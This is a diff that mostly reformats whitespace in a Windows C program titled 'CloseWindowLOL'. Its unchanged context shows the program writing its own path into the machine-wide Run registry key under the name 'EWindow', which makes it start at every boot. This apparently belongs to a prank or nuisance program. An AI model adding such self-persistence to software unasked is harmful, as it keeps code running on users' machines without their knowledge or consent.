@@ -10,15 +10,15 @@ int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,i
 	MSG msg;
 
 	memset(&wc,0,sizeof(wc));
-	wc.cbSize		 = sizeof(WNDCLASSEX);
-	wc.lpfnWndProc	 = WndProc;
-	wc.hInstance	 = hInstance;
-	wc.hCursor		 = LoadCursor(NULL, IDC_ARROW);
+	wc.cbSize = sizeof(WNDCLASSEX);
+	wc.lpfnWndProc = WndProc;
+	wc.hInstance = hInstance;
+	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
 	
 	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
 	wc.lpszClassName = "CloseWindowLOL";
-	wc.hIcon		 = LoadIcon(NULL, IDI_APPLICATION);
-	wc.hIconSm		 = LoadIcon(NULL, IDI_APPLICATION);
+	wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
+	wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
 
 	if(!RegisterClassEx(&wc))
 	{
@@ -26,8 +26,7 @@ int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,i
 		return 0;
 	}
 
-	hwnd = CreateWindowEx(WS_EX_CLIENTEDGE,"CloseWindowLOL","CloseWindowLOL",NULL,
-		   CW_USEDEFAULT,CW_USEDEFAULT,0,0,NULL,NULL,hInstance,NULL);
+	hwnd = CreateWindowEx(WS_EX_CLIENTEDGE,"CloseWindowLOL","CloseWindowLOL",NULL,CW_USEDEFAULT,CW_USEDEFAULT,0,0,NULL,NULL,hInstance,NULL);
 		
 	if(hwnd == NULL)
 	{
@@ -88,18 +87,18 @@ LRESULT CALLBACK WndProc(HWND hwnd,UINT Message,WPARAM wParam,LPARAM lParam)
 		
 		case WM_CREATE:	
 		{	  
-		    //判断环境是否为WOW64
-		    BOOL isWOW64;  
-		    REGSAM P;  
-		    IsWow64Process(GetCurrentProcess(),&isWOW64);  
-		    if (isWOW64)
+			//判断环境是否为WOW64
+			BOOL isWOW64;  
+			REGSAM P;  
+			IsWow64Process(GetCurrentProcess(),&isWOW64);  
+			if (isWOW64)
 			{  
-		        P = KEY_WRITE | KEY_WOW64_64KEY;  
-		    }
-		    else
+				P = KEY_WRITE | KEY_WOW64_64KEY;  
+			}
+			else
 			{  
-		        P = KEY_WRITE;  
-		    }
+				P = KEY_WRITE;  
+			}
 			GetModuleFileName(0,Filename,100);
 			RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,NULL,0,P,NULL,&hKey,NULL);
 			RegSetValueEx(hKey,"EWindow",0,REG_SZ,(CONST BYTE*)Filename,sizeof(Filename)*sizeof(TCHAR));
